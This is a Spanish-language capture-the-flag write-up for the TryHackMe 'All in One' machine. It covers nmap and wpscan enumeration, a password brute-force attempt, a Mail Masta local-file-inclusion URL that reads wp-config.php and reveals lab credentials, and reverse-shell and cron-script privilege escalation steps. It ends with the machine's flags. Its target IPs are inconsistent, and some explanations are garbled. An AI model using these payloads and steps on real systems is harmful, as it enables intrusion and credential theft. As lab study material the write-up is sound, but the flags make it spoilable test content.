@@ -1,0 +1,145 @@
+>> Máquina tryhackme
+>>> **ALL IN ONE**
+
+> IP de la máquina: 10.18.112.21
+
+> Escaneo NMAP
+   • nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn -T3 10.18.112.21 -oN escaneo
+
+-p-: Esto indica que se deben escanear todos los puertos en los dispositivos objetivo. El guion en lugar de un número de puerto significa que se escanearán todos los puertos.
+
+-sS: Este es el tipo de escaneo a realizar. En este caso, se está utilizando un escaneo de tipo SYN (conocido como escaneo SYN Stealth), que es una técnica para determinar qué puertos están abiertos en un dispositivo sin completar completamente las conexiones TCP.
+
+-sC: Esto indica que se deben ejecutar scripts de secuencia de comandos predeterminados en puertos y servicios específicos para recopilar más información sobre los servicios que se están ejecutando.
+
+--open: Esto le indica a nmap que solo muestre los puertos que están marcados como "abiertos", es decir, aquellos en los que se detecta actividad.
+
+--min-rate 5000: Esto establece la velocidad mínima del escaneo en 5000 paquetes por segundo. Esto puede aumentar la velocidad del escaneo, pero también puede aumentar el riesgo de detección por parte de sistemas de seguridad (a menor velocidad, más preciso es el escaneo; entre 2000 y 2500 es el ideal en un entorno real).
+
+-vvv: Esto establece el nivel de verbosidad del escaneo en muy alto. Esto significa que la salida mostrará información detallada sobre el proceso de escaneo.
+
+-n: Esto deshabilita la resolución de nombres DNS, lo que significa que nmap no intentará resolver las direcciones IP en nombres de host.
+
+-Pn: Esto indica que se debe suponer que los dispositivos objetivo están vivos, incluso si no responden a los pings.
+
+-T3: Se utiliza para establecer el nivel de agresividad del escaneo. Los valores posibles van desde 0 (escaneo suave) hasta 5 (escaneo muy agresivo). Como mi computadora tiene un i5 y 8 GB de RAM, un valor entre 3 y 4 sería lo correcto.
+
+-oN escaneo: Esto establece el formato y el nombre del archivo de salida para el registro de resultados del escaneo. En este caso, la salida se guardará en un archivo llamado "escaneo" en un formato específico.
+--------
+
+>> Escaneo NMAP:
+   El resultado de nmap dio los siguientes puertos abiertos:
+
+   • Puerto 21 (ftp)
+   • Puerto 22 (ssh) - Openssh 7.6p1
+   • Puerto 80 (http)
+   Se investigó, es un servidor Ubuntu. Se investigará más.
+
+>> Puerto 21:
+   Se ingresó, ya que era un login anónimo, pero no permite interacción y no hay nada relevante.
+
+>> Puerto 22:
+
+>> Puerto 80:
+   Es un servidor Ubuntu. Se fuzzó con Gobuster para ver resultados, y nos arrojó los siguientes enlaces:
+   • /wordpress
+   • /hackathons
+
+   > /wordpress: Aquí encontramos un usuario "elyana", que corresponde a un usuario de WordPress.
+   Procedemos a fuzzear "/wordpress".
+   • /wordpress/wp-content/
+   • /wordpress/wp-includes/
+   • /wordpress/wp-admin/
+
+   > wp-content: Página oculta
+   > wp-includes: Muchísimos archivos y carpetas
+   > wp-admin: Panel de administración de WordPress, en el cual, al colocar "elyana", arroja como resultado que, en efecto, es un usuario.
+
+> /hackathons: Respuesta de broma
+
+>> Fuerza bruta a /wordpress/wp-admin
+   > wpscan --url /wordpress/wp-admin/ -U elyana -P (wordlist)
+
+--url: la URL a atacar
+-U: listado de usuarios
+-P: wordlist a utilizar
+
+El ataque de fuerza bruta al usuario "elyana" dio negativo.
+
+Pasaremos a enumerar los plugins de WordPress para encontrar alguna vulnerabilidad.
+
+>> Búsqueda de plugins vulnerables /wordpress/wp-admin
+   > wpscan --url wordpress/wp-admin/ -e p
+
+-e: enumerar
+p: plugins
+
+> Resultado:
+   mail-masta
+   | Location: http://10.10.140.25/wordpress/wp-content/plugins/mail-masta/
+   | Latest Version: 1.0 (up to date)
+   | Last Updated: 2014-09-19T07:52:00.000Z
+   |
+   | Found By: Urls In Homepage (Passive Detection)
+   |
+   | Version: 1.0 (80% confidence)
+   | Found By: Readme - Stable Tag (Aggressive Detection)
+   | - http://10.10.140.25/wordpress/wp-content/plugins/mail-masta/readme.txt
+
+   reflex-gallery
+   | Location: http://10.10.140.25/wordpress/wp-content/plugins/reflex-gallery/
+   | Latest Version: 3.1.7 (up to date)
+   | Last Updated: 2021-03-10T02:38:00.000Z
+   |
+   | Found By: Urls In Homepage (Passive Detection)
+   |
+   | Version: 3.1.7 (80% confidence)
+   | Found By: Readme - Stable Tag (Aggressive Detection)
+   | - http://10.10.140.25/wordpress/wp-content/plugins/reflex-gallery/readme.txt
+
+>> Exploits a utilizar:
+
+> Reflex Gallery Exploit:
+   https://github.com/D3Ext/Reflex-Gallery-Exploit
+
+Sin resultados, el código da error.
+
+> WordPress Plugin Mail Masta 1.0 - Local File Inclusion
+   > https://github.com/p0dalirius/CVE-2016-10956-mail-masta
+
+Este código de Python realiza una reverse shell y crea una carpeta "/etc/passwd", lo cual luego nos permite introducir un payload en la URL de la víctima.
+
+>> http://10.10.20.7/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/read=convert.base64-encode/resource=../../../../../wp-config.php
+
+Haciendo traversal directory llegamos a la carpeta "wp-config.php" que guarda las credenciales (../../../../../wp-config.php).
+
+El resultado estaba en base64, con "echo 'texto' | base64 -d" obtenemos el siguiente resultado:
+
+   > "
+   /** MySQL database username */
+   define( 'DB_USER', 'elyana' );
+
+   /** MySQL database password */
+   define( 'DB_PASSWORD', 'H@ckme@123' );
+   "
+
+Ya dentro del menú principal de WordPress, inyectamos código en PHP para crear una reverse shell (pentest monkey). Ahora con Netcat podemos interceptar los paquetes.
+
+Ya estando dentro de la máquina víctima, necesitamos escalar privilegios. Para eso, se ingresarán los siguientes comandos:
+
+> $ script /dev/null -c bash (enter)
+> (control Z) "suspended nc -nlvp 443" (enter)
+
+>> stty raw -echo; fg (enter)
+"[1] + continued nc -nlvp 443"
+reset xterm (enter)
+> export SHELL=bash
+> export TERM=xterm
+
+Ya con esto, ahora podemos movernos con mejor fluidez dentro de la máquina víctima. Ahora procedemos a escalar al usuario root, para esto necesitamos encontrar archivos vulnerables; Con el comando "lsof | grep REG" podemos encontrar qué archivos se ejecutan en segundo plano. Así encontramos "var/backups/script.sh", un archivo editable.
+
+Realizamos una reverse shell en bash al puerto 444 (indistinto).
+La reverse shell es un éxito (:D), ahora podemos leer archivos como root. Esto nos permite leer cualquier archivo. Obtenemos las flags en base 64, las decodificamos con "echo 'texto' | base64 -d" y ya tenemos las flags requeridas.
+
+>>> ROOT: THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
+>>> ELYANA: THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}"
